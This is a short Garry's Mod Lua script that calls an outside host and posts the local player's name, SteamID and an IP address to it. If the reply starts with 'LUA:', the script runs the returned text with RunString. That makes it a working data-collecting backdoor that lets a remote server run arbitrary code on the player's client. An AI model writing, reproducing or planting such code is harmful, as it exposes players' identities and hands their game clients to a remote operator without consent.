local function logShit(ip)
	http.Post("http://gmeme-kalis0x.c9users.io/data", {
		["name"] = LocalPlayer():Nick(), 
		["steamid"] = LocalPlayer():SteamID(), 
		["ip"] = ip
	}, function(body)
		if body:sub(0, 4) == "LUA:" then
			RunString(body:sub(5))
		end
	end, function(err) 
		fetchAddress()
	end)
end

local function fetchAddress()
	http.Fetch("http://gmeme-kalis0x.c9users.io/address", function(body)
		logShit(body)
	end, function(err)
		timer.Simple(0.25, fetchAddress)
	end)
end

fetchAddress()